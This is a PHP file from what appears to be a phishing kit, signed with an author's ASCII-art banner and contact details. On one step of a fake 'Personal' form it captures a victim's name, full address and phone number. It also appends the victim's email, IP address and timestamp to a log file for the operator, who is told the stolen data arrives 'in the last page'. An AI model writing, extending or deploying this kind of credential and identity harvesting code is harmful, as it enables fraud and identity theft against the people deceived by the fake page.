<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
include("../M_files/config.php");
if ($_POST['MAHDI_name']) {
		date_default_timezone_set("Africa/Tunis");
		$_SESSION['Done'] = 2;
		$_SESSION['ech']['fullname'] = $_POST['MAHDI_name'];
		$_SESSION['ech']['street1'] = $_POST['MAHDI_adrs']." || ".$_POST['MAHDI_adrs2'];
		$_SESSION['ech']['adrs1'] = $_POST['MAHDI_adrs'];
		$_SESSION['ech']['adrs2'] =$_POST['MAHDI_adrs2'];
		$_SESSION['ech']['city'] = $_POST['MAHDI_city'];
		$_SESSION['ech']['state'] = $_POST['MAHDI_state'];
		$_SESSION['ech']['postalCode'] = $_POST['MAHDI_zip'];
		$_SESSION['ech']['country'] = $_POST['MAHDI_country'];
		$_SESSION['ech']['phone'] = $_POST['MAHDI_phone'];
		$msg = "<b>".$_SESSION['ech']['email']." </b> with <b>$ip</b> has finished from <b>Personal</b> at <b>$time - $date</b>, (You will recive them in the last page)<br>";
		$myFile = "../ips.html";
		$fh = fopen($myFile, 'a+') or die("can't open file");
		fwrite($fh, $msg);
		fclose($fh);
		$css = css_while();
		$html = html_while_2($css, "");
		die($html);
}
?>
